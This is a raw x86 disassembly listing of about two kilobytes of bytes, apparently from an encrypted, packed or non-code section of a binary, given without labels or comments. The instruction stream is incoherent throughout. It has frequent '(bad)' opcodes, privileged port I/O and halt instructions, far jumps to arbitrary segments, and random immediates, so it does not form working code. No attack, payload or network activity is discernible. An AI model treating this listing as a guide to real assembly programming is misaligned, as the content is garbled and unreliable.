  427424:	fcomip st,st(7)
  427426:	(bad)  
  427427:	f2xm1  
  427429:	dec    BYTE PTR [edx]
  42742b:	in     eax,dx
  42742c:	hlt    
  42742d:	aam    0xb
  42742f:	in     eax,0xd2
  427431:	mov    edi,0xd2cee4e7
  427436:	iret   
  427437:	mov    ch,0xce
  427439:	(bad)  
  42743a:	xlat   BYTE PTR ds:[ebx]
  42743b:	repz enter 0xeaef,0xc3
  427440:	aad    0xc0
  427442:	(bad)  
  427444:	ffree  st(3)
  427446:	in     eax,0xd7
  427448:	(bad)  
  427449:	in     al,0xde
  42744b:	in     eax,0xd4
  42744d:	mov    BYTE PTR [ecx],0x8
  427450:	scas   eax,DWORD PTR es:[edi]
  427451:	into   
  427452:	lock in eax,dx
  427454:	mov    dh,0xb4
  427456:	in     al,dx
  427457:	leave  
  427458:	xlat   BYTE PTR ds:[ebx]
  427459:	(bad)  
  42745a:	into   
  42745b:	std    
  42745c:	fcomi  st,st(4)
  42745e:	fidivr WORD PTR [ebx-0x3e20470d]
  427464:	out    0xf3,eax
  427466:	bnd jmp 0xdd076a6f
  42746c:	push   cs
  42746d:	push   cs
  42746e:	out    dx,al
  42746f:	adc    DWORD PTR [ecx-0xb2e0c1b],esi
  427475:	(bad)
  427478:	shl    DWORD PTR [ecx-0xe0b3b09],0x2
  42747f:	int    0xdc
  427481:	icebp  
  427482:	into   
  427483:	loop   0x42748c
  427485:	aad    0xfa
  427487:	jmp    0x10237496
  42748c:	out    0xfb,al
  42748e:	or     ebp,ecx
  427490:	shr    al,1
  427492:	out    0xc5,al
  427494:	ret    0xb1e3
  427497:	shl    esi,1
  427499:	ror    ecx,1
  42749b:	stc    
  42749c:	icebp  
  42749d:	(bad)  
  42749e:	(bad)  
  42749f:	fdiv   QWORD PTR [edi+0x2f2ec00]
  4274a5:	cmc    
  4274a6:	clc    
  4274a7:	out    0xdc,eax
  4274a9:	jmp    0x427471
  4274ab:	retf   0xcd03
  4274ae:	les    edx,FWORD PTR [edx]
  4274b0:	jmp    0xd5fb:0xf0d7ace9
  4274b7:	repnz into 
  4274b9:	repz int 0xb4
  4274bc:	xlat   BYTE PTR ds:[ebx]
  4274bd:	ror    bh,cl
  4274bf:	(bad)  
  4274c1:	hlt    
  4274c2:	in     al,dx
  4274c3:	out    0xdf,eax
  4274c5:	(bad)  
  4274c6:	rcl    esi,cl
  4274c8:	add    al,0xff
  4274ca:	cli    
  4274cb:	loop   0x427497
  4274cd:	in     al,0xea
  4274cf:	add    cl,ch
  4274d1:	scas   al,BYTE PTR es:[edi]
  4274d2:	fucom  st(5)
  4274d4:	out    dx,eax
  4274d5:	leave  
  4274d6:	call   0xd43b26a4
  4274db:	lock sar dl,cl
  4274de:	repz aam 0xf6
  4274e1:	mov    ebp,0xc0ffecfe
  4274e6:	repnz retf 0x7e7
  4274ea:	enter  0xedcf,0xca
  4274ee:	retf   
  4274ef:	std    
  4274f0:	rol    edi,1
  4274f2:	test   al,0xef
  4274f4:	call   0xe6fe40e3
  4274f9:	(bad)  
  4274fb:	clc    
  4274fc:	int    0xd2
  4274fe:	loop   0x4274c8
  427500:	add    ch,ch
  427502:	fadd   st(0),st
  427504:	test   BYTE PTR [ecx],0xbc
  427507:	ret    0x7e4
  42750a:	in     al,0xca
  42750c:	mov    DWORD PTR ds:0xa6c5e107,0xdbd0f3f3
  427516:	retf   
  427517:	out    0xe8,al
  427519:	xlat   BYTE PTR ds:[ebx]
  42751a:	(bad)
  42751d:	mov    ebp,0xfdf8e3fd
  427522:	fiadd  DWORD PTR [ebx]
  427524:	fsubr  st(3),st
  427526:	rol    BYTE PTR [edx],0xdc
  427529:	cli    
  42752a:	test   DWORD PTR [ecx],0xfa01090d
  427530:	(bad)  
  427532:	jecxz  0x42752a
  427534:	rcr    ah,cl
  427536:	(bad)  
  427537:	in     al,0xd8
  427539:	mov    ebx,0xdbd5e8f9
  42753e:	hlt    
  42753f:	icebp  
  427540:	mov    ebx,0xe3c0bdc1
  427545:	aad    0xcb
  427547:	ret    0xfe07
  42754a:	test   dl,0x2
  42754d:	or     ecx,edx
  42754f:	push   cs
  427550:	fcom   st(2)
  427552:	(bad)
  427555:	out    0xf6,al
  427557:	(bad)  
  427558:	int3   
  427559:	in     al,dx
  42755a:	enter  0xcfe5,0xb5
  42755e:	int3   
  42755f:	jecxz  0x427541
  427561:	ret    0xfdd0
  427564:	(bad)  
  427566:	push   es
  427567:	in     eax,0xc7
  427569:	(bad)  
  42756a:	(bad)  
  42756c:	fild   WORD PTR [esi]
  42756e:	stc    
  42756f:	std    
  427570:	loope  0x427534
  427572:	test   al,0xa8
  427574:	imul   ebp
  427576:	mov    dl,0xd5
  427578:	in     eax,0xc8
  42757a:	mov    cl,0xf2
  42757c:	icebp  
  42757d:	std    
  42757e:	fldlg2 
  427580:	mov    edi,0xd8f1d4d1
  427585:	not    edx
  427587:	(bad)  
  427588:	retf   
  427589:	(bad)  
  42758a:	(bad)  
  42758c:	in     eax,0xdd
  42758e:	push   cs
  42758f:	fisub  DWORD PTR [edi-0xa3f1848]
  427595:	enter  0xd1e8,0xb4
  427599:	in     al,dx
  42759a:	(bad)  
  42759b:	div    ebp
  42759d:	int    0xd6
  42759f:	ret    0xc1dc
  4275a2:	add    dl,dl
  4275a4:	(bad)  
  4275a6:	(bad)  
  4275a7:	push   es
  4275a8:	ror    edx,1
  4275aa:	push   cs
  4275ab:	ffree  st(6)
  4275ad:	fcom   st(3)
  4275af:	repz int 0xd8
  4275b2:	shr    bl,0xe4
  4275b5:	shr    dh,1
  4275b7:	call   0xd83243ae
  4275bc:	cmc    
  4275bd:	cmc    
  4275be:	sti    
  4275bf:	(bad)  
  4275c1:	cli    
  4275c2:	out    dx,al
  4275c3:	add    esi,edi
  4275c5:	(bad)  
  4275c6:	fsub   st,st(2)
  4275c8:	add    eax,0xa0dcbd9
  4275cd:	jmp    0x4275d9
  4275cf:	loopne 0x42759d
  4275d1:	shl    ebx,1
  4275d3:	xlat   BYTE PTR ds:[ebx]
  4275d4:	in     eax,0xcf
  4275d6:	mov    cl,0xda
  4275d8:	(bad)  
  4275d9:	mov    ecx,0xd3c8d7f5
  4275de:	in     al,dx
  4275df:	idiv   esi
  4275e1:	hlt    
  4275e2:	rcr    ch,cl
  4275e4:	add    dl,ch
  4275e6:	sti    
  4275e7:	add    eax,0xdad8e1de
  4275ec:	in     eax,dx
  4275ed:	(bad)  
  4275ef:	retf   
  4275f0:	mov    esi,0xacd5efe4
  4275f5:	jmp    0xd1ed:0xb5b5d9c2
  4275fc:	in     al,0xda
  4275fe:	stc    
  4275ff:	rol    DWORD PTR [edx],cl
  427601:	mov    edx,0xbad1e1d2
  427606:	fild   WORD PTR [ecx]
  427608:	jmp    0x7186cfc
  42760d:	leave  
  42760e:	or     ah,ch
  427610:	ror    dh,1
  427612:	test   eax,0xd6cdbce0
  427617:	out    0xec,eax
  427619:	shl    dh,0xcb
  42761c:	leave  
  42761d:	leave  
  42761e:	ret    
  42761f:	mov    edx,0xe5bdb903
  427624:	out    0xde,al
  427626:	fld    QWORD PTR [esi]
  427628:	aad    0xcb
  42762a:	in     eax,0xd6
  42762c:	ficom  DWORD PTR [ebx]
  42762e:	out    0x7,al
  427630:	fdivrp st(2),st
  427632:	enter  0xc8f2,0xd7
  427636:	ret    0xd2e7
  427639:	out    dx,eax
  42763a:	repnz mov ecx,0xf4f4dae8
  427640:	out    dx,al
  427641:	mov    edi,0xe2d5dbc0
  427646:	or     bh,ch
  427648:	fsubrp st(3),st
  42764a:	or     dh,bl
  42764c:	add    eax,0xceccc503
  427651:	fdiv   st,st(1)
  427653:	loop   0x427603
  427655:	ret    
  427656:	cmc    
  427657:	mov    bh,0xcb
  427659:	xlat   BYTE PTR ds:[ebx]
  42765a:	in     al,0xe9
  42765c:	ror    bh,1
  42765e:	dec    esp
  427660:	fsub   st(4),st
  427662:	out    dx,eax
  427663:	cli    
  427664:	(bad)  
  427665:	fdiv   st,st(6)
  427667:	fxch   st(2)
  427669:	(bad)  
  42766a:	div    dh
  42766c:	add    dh,ch
  42766e:	(bad)
  427671:	mov    al,0xec
  427673:	ret    
  427674:	shl    ah,1
  427676:	mul    edi
  427678:	leave  
  427679:	icebp  
  42767a:	cli    
  42767b:	leave  
  42767c:	neg    esi
  42767e:	loop   0x42765f
  427680:	mov    ebx,0x5e5d302
  427685:	stc    
  427686:	(bad)  
  427687:	fldl2t 
  427689:	out    dx,eax
  42768a:	add    ecx,DWORD PTR [ebx]
  42768c:	sti    
  42768d:	retf   0xe5fb
  427690:	scas   al,BYTE PTR es:[edi]
  427691:	out    dx,eax
  427692:	lock in al,dx
  427694:	in     al,dx
  427695:	int3   
  427696:	out    dx,al
  427697:	(bad)  
  427698:	jmp    0xd4fa:0xdff8dfcf
  42769f:	in     eax,dx
  4276a0:	mov    esp,0xdcd9c1d0
  4276a5:	std    
  4276a6:	fild   DWORD PTR ds:0xea0fe2d4
  4276ac:	add    eax,DWORD PTR [edx]
  4276ae:	(bad)  
  4276af:	in     eax,0xb2
  4276b1:	enter  0xf0ec,0xbd
  4276b5:	in     eax,0xda
  4276b7:	in     al,dx
  4276b8:	int3   
  4276b9:	fcom   st(4)
  4276bb:	(bad)  
  4276bd:	mov    edi,0xd103c9da
  4276c2:	mov    eax,0xbdbcd6f9
  4276c7:	fdivr  st(0),st
  4276c9:	shl    edx,0xc9
  4276cc:	jmp    0x4276a8
  4276ce:	retf   0xa70c
  4276d1:	scas   eax,DWORD PTR es:[edi]
  4276d2:	into   
  4276d3:	mov    esp,0xe4b4c3c6
  4276d8:	loopne 0x4276ca
  4276da:	(bad)  
  4276dc:	jmp    0x4276d6
  4276de:	int3   
  4276df:	mov    ecx,0xfbf0b9de
  4276e4:	fadd   st,st(4)
  4276e6:	add    edi,edi
  4276e8:	shl    edx,1
  4276ea:	jmp    0x4276b4
  4276ec:	out    0xd9,eax
  4276ee:	jmp    0xd5c9:0xadadf2c8
  4276f5:	icebp  
  4276f6:	into   
  4276f7:	mov    bh,0xcd
  4276f9:	(bad)  
  4276fa:	hlt    
  4276fb:	into   
  4276fc:	jmp    0xdd3259f7
  427701:	out    0xb9,eax
  427703:	mov    esp,0xe6d5f8d2
  427708:	out    0xe1,eax
  42770a:	jecxz  0x4276ea
  42770c:	fadd   DWORD PTR [esp+ebp*8]
  42770f:	enter  0xefe0,0xe3
  427713:	rcr    ch,cl
  427715:	jmp    0x4276c7
  427717:	mov    dl,0xf5
  427719:	iret   
  42771a:	icebp  
  42771b:	icebp  
  42771c:	mov    ecx,0xb7e9dcf2
  427721:	cmc    
  427722:	fsubrp st(0),st
  427724:	fstp   TBYTE PTR [edx-0x3d401efa]
  42772a:	fsubp  st(1),st
  42772c:	out    0xc5,eax
  42772e:	into   
  42772f:	std    
  427730:	mov    edi,0xeae0f3eb
  427735:	into   
  427736:	imul   al
  427738:	call   0xc9025f11
  42773d:	in     eax,dx
  42773e:	fidivr DWORD PTR [ebp-0x32273d46]
  427744:	in     al,dx
  427745:	loopne 0x427721
  427747:	cli    
  427748:	push   es
  427749:	clc    
  42774a:	push   es
  42774b:	in     al,0xca
  42774d:	add    ecx,DWORD PTR [edi]
  42774f:	fstp   st(1)
  427751:	call   0xc8164d02
  427756:	out    dx,eax
  427757:	ror    ecx,1
  427759:	int    0xb1
  42775b:	cmc    
  42775c:	fxch   st(4)
  42775e:	enter  0xbcb4,0xbd
  427762:	fadd   st,st(3)
  427764:	in     al,0xc2
  427766:	mov    ecx,0xeb03cb02
  42776b:	fld1   
  42776d:	loope  0x427767
  42776f:	int    0xe9
  427771:	jmp    0x42773d
  427773:	jmp    0xd72c5b61
  427778:	xlat   BYTE PTR ds:[ebx]
  427779:	(bad)  
  42777a:	icebp  
  42777b:	lods   al,BYTE PTR ds:[esi]
  42777c:	fcmovnu st,st(1)
  42777e:	in     eax,dx
  42777f:	call   0x1014e3c
  427784:	mov    edi,0xddc3f6fa
  427789:	add    esi,esp
  42778b:	(bad)  
  42778c:	leave  
  42778d:	or     eax,0xe5affad9
  427792:	neg    ch
  427794:	lods   eax,DWORD PTR ds:[esi]
  427795:	mov    esp,0xe6eaccf5
  42779a:	shr    ebx,cl
  42779c:	mov    eax,0xb8def8
  4277a1:	inc    cl
  4277a3:	loopne 0x4277a5
  4277a5:	inc    DWORD PTR [edx]
  4277a7:	or     esp,edx
  4277a9:	aad    0xfb
  4277ab:	(bad)  
  4277ac:	add    al,0xe
  4277ae:	fmul   st(6),st
  4277b0:	jmp    0xb3ee:0xb2c0eac6
  4277b7:	lods   al,BYTE PTR ds:[esi]
  4277b8:	leave  
  4277b9:	mov    dh,0xef
  4277bb:	(bad)  
  4277bc:	call   0xef2f6577
  4277c1:	mov    dh,0xd3
  4277c3:	(bad)  
  4277c4:	fcmovnu st,st(4)
  4277c6:	rol    BYTE PTR ds:0xefc7e9fd,1
  4277cc:	(bad)  
  4277cd:	repz (bad) 
  4277cf:	fldcw  WORD PTR [ecx+ebp*4-0x43133f1b]
  4277d6:	retf   
  4277d7:	lds    esi,FWORD PTR [ebp-0x324a4705]
  4277dd:	sar    BYTE PTR [ecx-0x4122ff04],1
  4277e3:	int    0xf1
  4277e5:	cmc    
  4277e6:	sti    
  4277e7:	(bad)  
  4277e9:	cmc    
  4277ea:	cli    
  4277eb:	std    
  4277ec:	ret    
  4277ed:	cld    
  4277ee:	add    ebp,edx
  4277f0:	loopne 0x4277e5
  4277f2:	mov    dl,0xc8
  4277f4:	rcl    dh,1
  4277f6:	(bad)  
  4277f7:	sti    
  4277f8:	(bad)  
  4277f9:	out    0xb5,al
  4277fb:	(bad)  
  4277fc:	mov    ah,0xdb
  4277fe:	aad    0xfe
  427800:	mov    edi,0xedd7f9d7
  427805:	fcmovnb st,st(7)
  427807:	rcl    ah,0xbe
  42780a:	retf   
  42780b:	aam    0xfe
  42780d:	or     al,cl
  42780f:	cld    
  427810:	repz scas al,BYTE PTR es:[edi]
  427812:	out    0xe7,al
  427814:	icebp  
  427815:	(bad)  
  427816:	retf   0xe1f3
  427819:	retf   
  42781a:	in     eax,0xc9
  42781c:	rcr    esp,1
  42781e:	call   edi
  427820:	mov    ecx,0xbcb8cdbd
  427825:	in     eax,0xf3
  427827:	jmp    0xd84c8214
  42782c:	jmp    0xb0cb:0xc5ecf800
  427833:	scas   al,BYTE PTR es:[edi]
  427834:	(bad)  
  427835:	ror    al,cl
  427837:	hlt    
  427838:	loopne 0x4277ef
  42783a:	int    0xf7
  42783c:	stc    
  42783d:	jmp    0xe3d2:0xef02dfea
  427844:	int3   
  427845:	repnz or esi,ecx
  427848:	aam    0xd0
  42784a:	xlat   BYTE PTR ds:[ebx]
  42784b:	add    bl,bl
  42784d:	or     bh,bl
  42784f:	jecxz  0x427835
  427851:	shl    BYTE PTR [ecx-0x154b4a14],1
  427857:	aam    0xd2
  427859:	in     eax,dx
  42785a:	mov    ebx,0xdef8f1c8
  42785f:	imul   esi
  427861:	int3   
  427862:	mov    edi,0xe4f5bef4
  427867:	add    eax,0xfadaf8d1
  42786c:	loop   0x427867
  42786e:	fsubr  st(1),st
  427870:	rol    esi,1
  427872:	lods   eax,DWORD PTR ds:[esi]
  427873:	fsubrp st(7),st
  427875:	lods   eax,DWORD PTR ds:[esi]
  427876:	div    dh
  427878:	loope  0x427843
  42787a:	call   0xc913313e
  42787f:	(bad)  
  427880:	in     eax,dx
  427881:	int    0xff
  427883:	mov    esp,0xd7de02ff
  427888:	out    0xc4,al
  42788a:	out    0xfa,eax
  42788c:	ret    
  42788d:	loope  0x427899
  42788f:	clc    
  427890:	mov    bl,0xf2
  427892:	mov    bh,0xed
  427894:	in     al,0xc0
  427896:	iret   
  427897:	test   al,0xed
  427899:	out    0xb9,eax
  42789b:	jmp    0xd7df:0xcaf6bfe5
  4278a2:	(bad)  
  4278a3:	rcl    ch,0xf6
  4278a6:	std    
  4278a7:	ret    
  4278a8:	(bad)  
  4278a9:	out    0xe1,eax
  4278ab:	jmp    0xc2c3:0x703e1fa
  4278b2:	call   0xb507659d
  4278b7:	mov    ebx,0xf6f0d0ee
  4278bc:	fcomip st,st(0)
  4278be:	ret    
  4278bf:	(bad)  
  4278c1:	mov    esp,0xbafdf3b5
  4278c6:	(bad)  
  4278c7:	cld    
  4278c8:	aam    0xe0
  4278ca:	or     DWORD PTR [edi],eax
  4278cc:	or     eax,0xe5130109
  4278d1:	in     eax,dx
  4278d2:	call   0xcb04408d
  4278d7:	int    0xba
  4278d9:	(bad)
  4278dc:	icebp  
  4278dd:	jecxz  0x4278b1
  4278df:	out    dx,eax
  4278e0:	(bad)  
  4278e1:	rcr    edi,1
  4278e3:	add    eax,0xc4d7e7f8
  4278e8:	or     DWORD PTR [ebx],ecx
  4278ea:	hlt    
  4278eb:	fucom  st(2)
  4278ed:	sti    
  4278ee:	std    
  4278ef:	pop    es
  4278f0:	fdivr  DWORD PTR [ebp-0xb1e3444]
  4278f6:	call   0xb22348df
  4278fb:	(bad)  
  4278fd:	push   DWORD PTR [ebp-0x3327122b]
  427903:	mov    eax,0x4f9c5f9
  427908:	loop   0x4278e2
  42790a:	(bad)  
  42790b:	jecxz  0x4278f5
  42790d:	paddsb mm2,mm2
  427910:	in     eax,0xdd
  427912:	mov    dl,0xf0
  427914:	mov    ch,0xf3
  427916:	(bad)  
  427917:	shl    eax,1
  427919:	mov    al,0xc9
  42791b:	fcmovu st,st(3)
  42791d:	fstp   TBYTE PTR [eax-0xa240f16]
  427923:	in     eax,0xd7
  427925:	rcr    ah,0xf2
  427928:	(bad)  
  427929:	sar    ah,0xc4
  42792c:	hlt    
  42792d:	fcompp 
  42792f:	add    eax,0xf7ebc2b2
  427934:	loop   0x42791a
  427936:	shl    DWORD PTR [ebp-0x48104640],cl
  42793c:	(bad)  [edi+edi*8-0x21234531]
  427943:	in     eax,0x2
  427945:	(bad)  
  427946:	shr    dl,cl
  427948:	add    ch,dl
  42794a:	loope  0x427934
  42794c:	fsub   st,st(2)
  42794e:	fmul   QWORD PTR ds:0xeecff1de
  427954:	out    0xf3,eax
  427956:	mov    cl,0xd6
  427958:	imul   ebp
  42795a:	jmp    0x42794b
  42795c:	repz out dx,al
  42795e:	leave  
  42795f:	clc    
  427960:	fstp   TBYTE PTR [ecx-0x18380c]
  427966:	shr    cl,0xd9
  427969:	add    ebp,edx
  42796b:	fimul  WORD PTR [eax]
  42796d:	jmp    0xd0ea445c
  427972:	test   al,0xc9
  427974:	fucomp st(5)
  427976:	out    dx,eax
  427977:	xlat   BYTE PTR ds:[ebx]
  427978:	loope  0x42795f
  42797a:	iret   
  42797b:	fcmovnb st,st(5)
  42797d:	lock (bad) 
  427980:	mov    edx,0x106eebe
  427985:	aam    0xf3
  427987:	add    al,0xe4
  427989:	sar    bl,1
  42798b:	aad    0xea
  42798d:	(bad)  
  42798e:	jmp    0xaf0b3d98
  427993:	icebp  
  427994:	out    0xb1,eax
  427996:	shl    BYTE PTR [esi+ebp*8-0x2e012a3c],0xee
  42799e:	rcl    esi,cl
  4279a0:	into   
  4279a1:	in     al,dx
  4279a2:	out    dx,al
  4279a3:	add    ebx,eax
  4279a5:	(bad)  
  4279a7:	pop    es
  4279a8:	out    0xe6,al
  4279aa:	cld    
  4279ab:	in     al,0x7
  4279ad:	loope  0x4279a1
  4279af:	add    ebp,ebp
  4279b1:	out    0xdc,al
  4279b3:	jmp    0x42799b
  4279b5:	enter  0xb3c9,0xb6
  4279b9:	into   
  4279ba:	(bad)  
  4279bb:	cli    
  4279bc:	fcomip st,st(3)
  4279be:	retf   0xd0ce
  4279c1:	add    cl,bh
  4279c3:	cmc    
  4279c4:	xlat   BYTE PTR ds:[ebx]
  4279c5:	xlat   BYTE PTR ds:[ebx]
  4279c6:	fsub   st,st(6)
  4279c8:	std    
  4279c9:	mul    bl
  4279cb:	test   BYTE PTR [eax+ecx*1],0xf8
  4279cf:	out    dx,eax
  4279d0:	in     al,0xe3
  4279d2:	in     eax,0xef
  4279d4:	shl    BYTE PTR [eax-0x27273d0a],0xb5
  4279db:	std    
  4279dc:	repz cli 
  4279de:	ret    
  4279df:	std    
  4279e0:	std    
  4279e1:	jmp    edi
  4279e3:	cli    
  4279e4:	mov    edi,0x905bcfc
  4279e9:	or     ah,al
  4279eb:	add    ebp,ecx
  4279ed:	add    ecx,esp
  4279ef:	int    0xd0
  4279f1:	in     al,0xad
  4279f3:	out    0xaf,eax
  4279f5:	shl    BYTE PTR [ebx-0x2448453b],cl
  4279fb:	out    dx,eax
  4279fc:	(bad)  
  4279fd:	mov    esp,0xedfebcd4
  427a02:	int3   
  427a03:	icebp  
  427a04:	(bad)  
  427a06:	les    eax,FWORD PTR [edx]
  427a08:	clc    
  427a09:	paddd  mm3,mm3
  427a0c:	jmp    0x4279d7
  427a0e:	pop    es
  427a0f:	add    al,ah
  427a11:	ret    
  427a12:	rcl    ebp,0xe8
  427a15:	out    0xfb,al
  427a17:	(bad)  [ebp-0x34094609]
  427a1d:	std    
  427a1e:	std    
  427a1f:	add    ecx,edx
  427a21:	(bad)  
  427a23:	jecxz  0x427a1b
  427a25:	icebp  
  427a26:	ret    
  427a27:	rol    BYTE PTR [esi],1
  427a29:	or     bh,ah
  427a2b:	in     eax,dx
  427a2c:	leave  
  427a2d:	clc    
  427a2e:	sti    
  427a2f:	repz scas al,BYTE PTR es:[edi]
  427a31:	retf   
  427a32:	rol    eax,cl
  427a34:	cmc    
  427a35:	shl    esp,cl
  427a37:	fprem  
  427a39:	mov    ah,0xf4
  427a3b:	mov    ecx,0xf1e3d6d5
  427a40:	fistp  QWORD PTR [esi-0x2a260e0d]
  427a46:	jmp    0xf9da:0xd5c1f7d9
  427a4d:	repz add edi,edi
  427a50:	iret   
  427a51:	test   al,0xe8
  427a53:	shl    bl,cl
  427a55:	int    0xb0
  427a57:	in     eax,0xeb
  427a59:	in     eax,dx
  427a5a:	out    dx,al
  427a5b:	mov    edi,0xf5f9dfe8
  427a60:	(bad)  
  427a61:	add    ch,dh
  427a63:	repnz shl ch,1
  427a66:	aad    0xf5
  427a68:	std    
  427a69:	add    ah,ah
  427a6b:	add    ch,dl
  427a6d:	out    0xc,al
  427a6f:	icebp  
  427a70:	out    dx,eax
  427a71:	out    0xac,al
  427a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a74:	mov    dh,0xc4
  427a76:	jecxz  0x427a45
  427a78:	mov    ebx,0xcef9ecd8
  427a7d:	aad    0xbc
  427a7f:	(bad)  
  427a81:	aad    0xff
  427a83:	in     eax,0xe1
  427a85:	lock shl bh,0x7
  427a89:	sar    ah,1
  427a8b:	in     al,0xeb
  427a8d:	pop    es
  427a8e:	adc    ecx,ecx
  427a90:	test   al,0xd8
  427a92:	enter  0xe6c5,0xc1
  427a96:	aam    0xe7
  427a98:	mov    ebx,0xf0b0cedf
  427a9d:	aam    0xd9
  427a9f:	mov    ebp,0xfafcd1e9
  427aa4:	vpsllq xmm4,xmm0,xmm0
  427aa8:	retf   
  427aa9:	pop    es
  427aaa:	cmc    
  427aab:	jmp    0xcb4f3daa
  427ab0:	stos   BYTE PTR es:[edi],al
  427ab1:	fdiv   st,st(6)
  427ab3:	mov    dl,0xae
  427ab5:	ror    esp,cl
  427ab7:	in     eax,dx
  427ab8:	in     al,dx
  427ab9:	mov    edx,0xeabbf5f4
  427abe:	cli    
  427abf:	aam    0xdb
  427ac1:	fst    st(4)
  427ac3:	cld    
  427ac4:	clc    
  427ac5:	mov    esp,0x7dc030a
  427aca:	fucom  st(3)
  427acc:	or     cl,BYTE PTR [esi]
  427ace:	jmp    0xd2c9:0xa9bcddcf
  427ad5:	icebp  
  427ad6:	mov    dh,0xc7
  427ad8:	retf   
  427ad9:	mov    al,0xf2
  427adb:	sar    BYTE PTR [ebx-0x103d3341],cl
  427ae1:	in     eax,dx
  427ae2:	(bad)  
  427ae3:	cld    
  427ae4:	cli    
  427ae5:	clc    
  427ae6:	add    al,0x7
  427ae8:	or     al,ah
  427aea:	(bad)  
  427aeb:	fadd   QWORD PTR [esi]
  427aed:	stc    
  427aee:	fisttp QWORD PTR [esi]
  427af0:	shl    ebx,0xdf
  427af3:	icebp  
  427af4:	loop   0x427ae2
  427af6:	shr    al,cl
  427af8:	fdiv   st,st(0)
  427afa:	fucomip st,st(2)
  427afc:	mov    ecx,0xf3ddb9fc
  427b01:	shr    esp,1
  427b03:	loopne 0x427afc
  427b05:	in     al,dx
  427b06:	mov    BYTE PTR ds:0xcaf6ebf8,0xdb
  427b0d:	in     eax,dx
  427b0e:	loop   0x427b0f
  427b10:	stos   BYTE PTR es:[edi],al
  427b11:	in     eax,0xcb
  427b13:	retf   0xdbe9
  427b16:	mov    cl,0xd6
  427b18:	mov    bh,0xb1
  427b1a:	jmp    0xfad9:0xd0f8feee
  427b21:	xlat   BYTE PTR ds:[ebx]
  427b22:	(bad)  
  427b23:	repz cld 
  427b25:	rol    DWORD PTR [esi],1
  427b27:	ror    BYTE PTR [eax],1
  427b29:	test   BYTE PTR [edx],0xfc
  427b2c:	fimul  WORD PTR [edx]
  427b2e:	or     esp,esi
  427b30:	shl    esi,0xd6
  427b33:	int3   
  427b34:	cmc    
  427b35:	mov    dl,0xf0
  427b37:	in     al,dx
  427b38:	mov    ecx,0xb3eff8ae
  427b3d:	out    dx,al
  427b3e:	fnstsw WORD PTR [edx-0x2f42fd28]
  427b44:	mov    ebx,0xf7e900dc
  427b49:	pop    es
  427b4a:	mov    ebp,0x404050f
  427b4f:	inc    ah
  427b51:	mov    eax,0xadc9ace4
  427b56:	cli    
  427b57:	(bad)  
  427b58:	out    dx,al
  427b59:	neg    edx
  427b5b:	hlt    
  427b5c:	in     eax,dx
  427b5d:	mov    dh,0xdf
  427b5f:	idiv   DWORD PTR [edi+0x7dcd907]
  427b65:	(bad)  
  427b66:	(bad)  
  427b68:	mul    edx
  427b6a:	jmp    0x427b6f
  427b6c:	jmp    0xadc8:0xe7030bde
  427b73:	loope  0x427b2b
  427b75:	call   0xb72b4f62
  427b7a:	aam    0xef
  427b7c:	xlat   BYTE PTR ds:[ebx]
  427b7d:	fidivr WORD PTR [eax+ecx*8-0x10d0625]
  427b84:	loope  0x427b8c
  427b86:	cld    
  427b87:	ret    0xe9d0
  427b8a:	add    ebx,ebp
  427b8c:	or     edi,eax
  427b8e:	add    esp,ebx
  427b90:	mov    ebp,0xcacae0c2
  427b95:	mov    ebx,0xf8dffab4
  427b9b:	stc    
  427b9c:	fdivrp st(1),st
  427b9e:	xlat   BYTE PTR ds:[ebx]
  427b9f:	repz fcmovbe st,st(2)
  427ba2:	shl    ebx,0xfc
  427ba5:	mov    esp,0x9fac0e0
  427baa:	add    bh,ah
  427bac:	or     ch,bh
  427bae:	add    eax,0xe1dce7cc
  427bb3:	retf   
  427bb4:	in     al,dx
  427bb5:	aam    0xfa
  427bb7:	jmp    0xe9076294
  427bbc:	lock cmc 
  427bbe:	rcr    esi,cl
  427bc0:	repnz mov edx,0xd2f2d6ed
  427bc6:	pop    es
  427bc7:	add    eax,0xdd50fd0
  427bcc:	add    eax,0xe50a040f
  427bd1:	mov    esi,0xb2adf5a5
  427bd6:	(bad)  
  427bd7:	int    0xb2
  427bd9:	jmp    0xeefc62dc
  427bde:	jmp    0xbeee:0xd9effbb9
  427be5:	shl    ch,1
  427be7:	mov    eax,0xf6fa070a
  427bec:	add    ebp,eax
  427bee:	sti    
  427bef:	out    dx,al
  427bf0:	(bad)  
  427bf1:	scas   al,BYTE PTR es:[edi]
  427bf2:	rol    al,1
  427bf4:	hlt    
  427bf5:	out    0xcb,al
  427bf7:	fxch   st(4)
  427bf9:	(bad)  
  427bfb:	fcmovbe st,st(4)
  427bfd:	jmp    0xd61139db
  427c02:	(bad)  
  427c04:	mov    ebp,0xcbc4feff
  427c09:	dec    dl
  427c0b:	aad    0xe2
  427c0d:	(bad)  
  427c0e:	or     cl,BYTE PTR [ecx]
  427c10:	fnsave [eax-0x3b531f1d]
  427c16:	sti    
  427c17:	mov    al,0xd6
  427c19:	cmc    
  427c1a:	iret   
  427c1b:	into   
  427c1c:	(bad)  
  427c1e:	into   
  427c1f:	int3   
  427c20:	loope  0x427bfd
  427c22:	fcomi  st,st(4)
  427c24:	idiv   BYTE PTR [edx+0x908f0c1]
  427c2a:	or     al,ah
  427c2c:	out    dx,al
  427c2d:	(bad)  
  427c2e:	retf   0xa9fe
  427c31:	iret   
  427c32:	mov    edi,0xe2b6e7c9
  427c37:	out    0xf6,al
  427c39:	(bad)  
  427c3a:	cli    
  427c3b:	(bad)  
  427c3c:	clc    
  427c3d:	call   0xc43a5f2f
  427c42:	sar    cl,1
  427c44:	(bad)  
  427c45:	(bad)  
  427c46:	loop   0x427c40
  427c48:	jmp    0xce275b41
  427c4d:	cld    
  427c4e:	int    0x4
  427c50:	mov    bl,0xca
  427c52:	imul   al
  427c54:	mov    bh,0xc5
  427c56:	mov    dh,0xca
  427c58:	fstp   TBYTE PTR [ecx-0x23402b4a]
  427c5e:	(bad)  
  427c60:	in     eax,dx
  427c61:	rcl    ch,cl
  427c63:	faddp  st(7),st
  427c65:	mov    edx,0xdbf0e3c2
  427c6a:	add    ah,ah
  427c6c:	(bad)  
  427c6e:	std    
  427c6f:	out    dx,al
  427c70:	(bad)  [eax-0x1b291610]
  427c76:	leave  
  427c77:	out    dx,eax
  427c78:	fidiv  DWORD PTR [edi-0xd212745]
  427c7e:	(bad)  
  427c80:	test   BYTE PTR [edi],0xfa
  427c83:	repz clc 
  427c85:	div    ebx
  427c87:	idiv   eax
  427c89:	neg    ebx
  427c8b:	fprem1 
  427c8d:	(bad)  
  427c8f:	movsx  eax,bl
  427c92:	icebp  
  427c93:	into   
